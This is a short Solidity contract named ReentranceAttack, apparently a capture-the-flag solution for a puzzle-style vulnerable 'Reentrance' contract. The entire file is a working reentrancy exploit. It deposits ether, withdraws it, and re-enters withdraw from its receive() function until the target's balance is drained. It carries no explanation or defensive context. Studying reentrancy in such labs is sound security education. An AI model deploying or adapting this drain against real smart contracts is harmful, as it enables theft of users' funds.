// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance target;

    constructor(address _targetAddress) public {
        target = IReentrance(_targetAddress);
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        uint256 _balance = target.balanceOf(address(this));
        target.withdraw(_balance);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
